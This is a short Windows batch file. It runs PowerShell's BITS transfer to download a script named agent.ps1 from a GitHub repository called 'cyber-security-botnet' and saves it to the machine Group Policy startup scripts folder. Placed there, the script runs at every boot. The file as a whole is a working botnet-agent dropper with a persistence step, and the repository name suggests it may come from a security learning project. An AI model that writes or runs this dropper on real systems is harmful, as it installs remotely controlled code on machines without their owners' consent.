@echo off

powershell -command "start-bitstransfer -source https://raw.githubusercontent.com/tprupsys/cyber-security-botnet/master/agent/agent.ps1 -destination \"%HOMEDRIVE%\Windows\System32\GroupPolicy\Machine\Scripts\Startup\agent.ps1\""